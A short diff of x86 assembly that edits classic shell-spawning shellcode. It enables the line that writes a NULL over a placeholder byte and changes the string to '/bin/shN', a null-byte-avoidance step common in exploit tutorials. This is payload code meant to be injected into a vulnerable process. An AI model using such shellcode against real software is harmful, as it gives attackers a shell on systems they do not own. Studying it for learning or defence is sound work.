@@ -15,7 +15,7 @@ _start:
 starter:
          popl %ebx              #get the address of the string
          xor  %eax, %eax
-         #mov  %al, 0x07(%ebx)   #put a NULL where the N is in the string
+         mov  %al, 0x07(%ebx)   #put a NULL where the N is in the string
          #movl %ebx, 0x08(%ebx)  #put the address of the string
                                 #to where the AAAA is
          #movl %ebx, 0x0c(%ebx)  #put 4 null bytes into where the BBBB is
@@ -26,4 +26,4 @@ starter:
  
 ender:
          call starter
-         .string "/bin/sh" #NAAAABBBB"
+         .string "/bin/shN" #NAAAABBBB"
